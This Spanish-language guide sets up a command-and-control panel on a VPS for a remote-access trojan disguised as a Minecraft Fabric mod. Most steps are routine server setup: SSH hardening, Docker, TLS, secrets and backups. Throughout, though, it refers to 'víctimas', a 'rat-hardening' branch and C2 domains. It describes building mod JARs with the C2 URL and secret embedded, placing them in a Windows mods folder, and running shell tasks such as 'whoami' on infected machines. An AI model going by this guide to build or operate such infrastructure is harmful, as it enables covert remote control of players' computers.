# Desplegar el panel en un VPS

Guía para dejar el panel accesible por HTTPS, con el agente conectando desde
cualquier red y el operador entrando desde escritorio o móvil.

Arquitectura final:

```
Windows/Minecraft  ──HTTPS/WSS──▶  Caddy (443)  ──▶  web + API  ──▶  PostgreSQL
Operador/móvil     ──HTTPS──────▶  Caddy
```

El panel no ejecuta Minecraft. Solo aloja la consola, la base de datos y las
descargas de builds.

## 0. Antes de empezar

Necesitas:

- Un VPS con **2 vCPU, 4 GB de RAM y 40 GB** como mínimo.
- Un dominio, por ejemplo `c2.tudominio.com`.
- Acceso SSH por clave.
- El JAR base del agente (`fabric-sync-0.3.6.jar` o superior). El panel le
  inyectará **tu** dominio; el JAR universal de la release apunta a producción.

Coste realista: **8–10 €/mes** de VPS + dominio. Hetzner CX22 o Netcup VPS 1000
son opciones suficientes.

Variables usadas en la guía:

```bash
export DOMAIN="c2.tudominio.com"
export ACME_EMAIL="tu@correo.com"
```

## 1. Crear el VPS

En Hetzner Cloud:

1. Crea un servidor **CX22**, imagen **Debian 12**, ubicación Alemania/Finlandia.
2. Añade tu clave SSH pública; no actives login por contraseña.
3. Activa **Backups**.
4. En el firewall del proveedor permite:
   - `22/tcp` solo desde tu IP.
   - `80/tcp` y `443/tcp` desde cualquier sitio.

Guarda la IP pública.

## 2. DNS

En tu proveedor de dominio o Cloudflare:

```
Tipo A   c2   IP_DEL_VPS   DNS only (nube gris)
```

No actives el proxy naranja hasta comprobar que HTTPS funciona. Caddy necesita
los puertos 80/443 y el DNS ya propagado.

## 3. Primer acceso

```bash
ssh root@IP_DEL_VPS
```

Crea el usuario de despliegue:

```bash
adduser --disabled-password --gecos "" spc
usermod -aG sudo spc
install -d -m 700 -o spc -g spc /home/spc/.ssh
cp /root/.ssh/authorized_keys /home/spc/.ssh/authorized_keys
chown spc:spc /home/spc/.ssh/authorized_keys
chmod 600 /home/spc/.ssh/authorized_keys
```

En **otra terminal**, comprueba que entras como `spc` antes de cerrar la sesión
de root:

```bash
ssh spc@IP_DEL_VPS
```

Endurece SSH en `/etc/ssh/sshd_config.d/99-spc.conf`:

```text
PermitRootLogin no
PasswordAuthentication no
PubkeyAuthentication yes
```

```bash
systemctl restart ssh
```

Firewall local:

```bash
ufw default deny incoming
ufw default allow outgoing
ufw allow from TU_IP_A_CASA to any port 22 proto tcp
ufw allow 80/tcp
ufw allow 443/tcp
ufw enable
apt update && apt -y upgrade
apt -y install fail2ban unattended-upgrades
```

## 4. Docker

```bash
sudo install -m 0755 -d /etc/apt/keyrings
curl -fsSL https://download.docker.com/linux/debian/gpg | sudo tee /etc/apt/keyrings/docker.asc >/dev/null
sudo chmod a+r /etc/apt/keyrings/docker.asc
echo "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.asc] https://download.docker.com/linux/debian $(. /etc/os-release && echo $VERSION_CODENAME) stable" | sudo tee /etc/apt/sources.list.d/docker.list >/dev/null
sudo apt update
sudo apt -y install docker-ce docker-ce-cli containerd.io docker-compose-plugin
sudo usermod -aG docker spc
```

Cierra y vuelve a entrar para aplicar el grupo.

## 5. Código

```bash
sudo install -d -m 750 -o spc -g spc /opt/spc
git clone https://github.com/uloaeth/server-pack-core.git /opt/spc
cd /opt/spc
git checkout fix/0.3.7-rat-hardening
cd console
```

Si la rama aún no está publicada, súbela antes desde tu equipo:

```bash
git push -u origin fix/0.3.7-rat-hardening
```

## 6. JAR base

Descarga la release **0.3.6** y verifica su hash:

```bash
mkdir -p /opt/spc/console
cd /opt/spc/console
curl -fL -o fabric-sync.jar \
  https://github.com/uloaeth/server-pack-core/releases/download/v0.3.6/fabric-sync-0.3.6.jar
curl -fL -o SHA256.txt \
  https://github.com/uloaeth/server-pack-core/releases/download/v0.3.6/SHA256.txt
grep 'fabric-sync' SHA256.txt | sha256sum -c -
```

`fabric-sync.jar` es solo la plantilla: el panel le inyecta la config de cada
build. No lo repartas tal cual.

## 7. Secretos y `.env`

```bash
cd /opt/spc/console
mkdir -p secrets
openssl rand -base64 24 | tr -d '\n' > secrets/db_password
printf 'postgresql://spc:%s@db:5432/spc?schema=public' "$(cat secrets/db_password)" > secrets/database_url
openssl rand -base64 48 | tr -d '\n' > secrets/jwt_secret
openssl rand -base64 32 | tr -d '\n' > secrets/master_key
chmod 600 secrets/*
```

Crea `.env`:

```bash
cp .env.example .env
nano .env
```

Valores que **debes** cambiar:

```env
NODE_ENV=production
PUBLIC_URL=https://c2.tudominio.com
DOMAIN=c2.tudominio.com
CORS_ORIGIN=https://c2.tudominio.com
ACME_EMAIL=tu@correo.com

DATABASE_URL=postgresql://spc:PLACEHOLDER@db:5432/spc?schema=public
DATABASE_URL_FILE=/run/secrets/database_url
JWT_SECRET=pega-aqui-secrets/jwt_secret
MASTER_KEY=pega-aqui-secrets/master_key

TRUST_PROXY=1
JAR_SOURCE=/opt/spc/fabric-sync.jar
JAR_SOURCE_HOST=/opt/spc/console/fabric-sync.jar
DISCORD_BRIDGE=0
```

`PUBLIC_URL` y `DOMAIN` deben coincidir. `MASTER_KEY` no se cambia sin
re-sellar los tokens de las víctimas.

Permisos:

```bash
chmod 600 .env
chmod 644 fabric-sync.jar
```

## 8. Arrancar

```bash
docker compose pull
docker compose build
docker compose up -d db redis
```

Genera el operador una sola vez y guarda la salida:

```bash
ADMIN_PASS="$(openssl rand -base64 24 | tr -d '\n')"
docker compose run --rm -e ROLE=seed -e SEED=1 -e SEED_ADMIN_PASSWORD="$ADMIN_PASS" api | tee /tmp/seed.txt
```

`/tmp/seed.txt` contiene la contraseña y los TOTP de admin, operator y viewer.
Guárdalos en el gestor de contraseñas y borra el archivo:

```bash
shred -u /tmp/seed.txt
```

Arranca el resto:

```bash
docker compose up -d
docker compose ps
```

Comprueba TLS y salud:

```bash
curl -fsS "https://$DOMAIN/api/console/health"
```

Caddy tarda unos segundos en emitir el certificado. Si falla, revisa DNS y
puertos 80/443.

## 9. Primer acceso

1. Abre `https://c2.tudominio.com/login`.
2. Email `admin@spc.local`.
3. Contraseña: la que guardaste.
4. TOTP: el secreto de `admin@spc.local` en Aegis/Google Authenticator.

Cambia la contraseña de `admin@spc.local` desde **Ajustes**.

## 10. Crear el JAR para Windows

1. Entra como admin.
2. Ve a **Builds → nuevo build**.
3. Nombre, versión y perfil. Para el primer test, perfil `full`.
4. Crea, pulsa el martillo y espera.
5. Descarga el JAR generado.

Ese JAR lleva dentro `https://c2.tudominio.com/api/v1` y el `build_secret`.

En Windows:

1. Instala Fabric Loader 0.20.1 y Fabric API 0.92.12+1.20.1.
2. Copia el JAR descargado a `mods/`.
3. Entra en un mundo.
4. Espera unos 30 s; la víctima aparece en **Equipos**.

No repartas el JAR de la release 0.3.6 para este panel: apunta a
`c2.spc-cloud.net`. Reparte siempre el JAR compilado por tu panel.

## 11. Móvil

Abre `https://c2.tudominio.com` en el navegador del móvil y guarda el acceso.
La tabla está pensada para escritorio: se usa con scroll horizontal. Las
acciones nuevas aparecen bloqueadas si el agente es 0.3.6.

## 12. Backups

Hetzner ya hace backups del servidor, pero añade un volcado de base de datos:

```bash
sudo mkdir -p /var/backups/spc
sudo tee /usr/local/bin/spc-backup >/dev/null <<'EOF'
#!/bin/sh
set -eu
cd /opt/spc/console
STAMP=$(date +%F-%H%M)
docker compose exec -T db pg_dump -U spc -Fc spc | gzip > "/var/backups/spc/db-$STAMP.dump.gz"
find /var/backups/spc -type f -mtime +14 -delete
EOF
sudo chmod 700 /usr/local/bin/spc-backup
sudo /usr/local/bin/spc-backup
```

Añade a root:

```cron
15 3 * * * /usr/local/bin/spc-backup
```

Copia los backups fuera del VPS. Restauración:

```bash
docker compose stop api worker web caddy
gunzip -c backup.dump.gz | docker compose exec -T db pg_restore -U spc -d spc --clean --if-exists
docker compose start api worker web caddy
```

## 13. Actualizar

```bash
cd /opt/spc
git pull
cd console
docker compose build
docker compose run --rm api npx prisma migrate deploy
docker compose up -d
```

Rollback:

```bash
cd /opt/spc
git checkout v0.3.6
cd console
docker compose build && docker compose up -d
```

## 14. Seguridad mínima

- `admin@spc.local` con contraseña fuerte y TOTP.
- `IP_ALLOWLIST` opcional; si lo activas, incluye tu IP móvil.
- PostgreSQL y Redis solo en la red interna de Docker.
- Firewall del proveedor y `ufw`.
- `fail2ban` y actualizaciones automáticas.
- Backups fuera del VPS.
- No compartas el JAR de un build fuera del grupo que corresponda.
- Revoca builds y víctimas cuando termines una prueba.

## 15. Problemas frecuentes

| Síntoma | Comprobación |
|---|---|
| Caddy no saca certificado | DNS, puertos 80/443, `docker compose logs caddy` |
| 502 en `/api` | `docker compose logs api`; contenedor caído o migración fallida |
| No aparece la víctima | JAR compilado por tu panel, reloj del cliente, firewall, URL correcta |
| Login dice `ip_not_allowlisted` | `IP_ALLOWLIST` y cabecera `X-Real-IP` |
| El móvil no abre | DNS público, no `localhost` ni IP LAN |
| Disco lleno | retención, `docker system df`, volumen `artifacts` |

## 16. Checklist final

- [ ] DNS apunta al VPS y HTTPS responde.
- [ ] `curl /api/console/health` da 200.
- [ ] Login con TOTP funciona y la contraseña de admin está cambiada.
- [ ] Backup manual ejecutado y copiado fuera.
- [ ] JAR compilado por el panel probado en Windows.
- [ ] Víctima visible y tarea `shell whoami` correcta.
- [ ] Acceso desde el móvil comprobado.
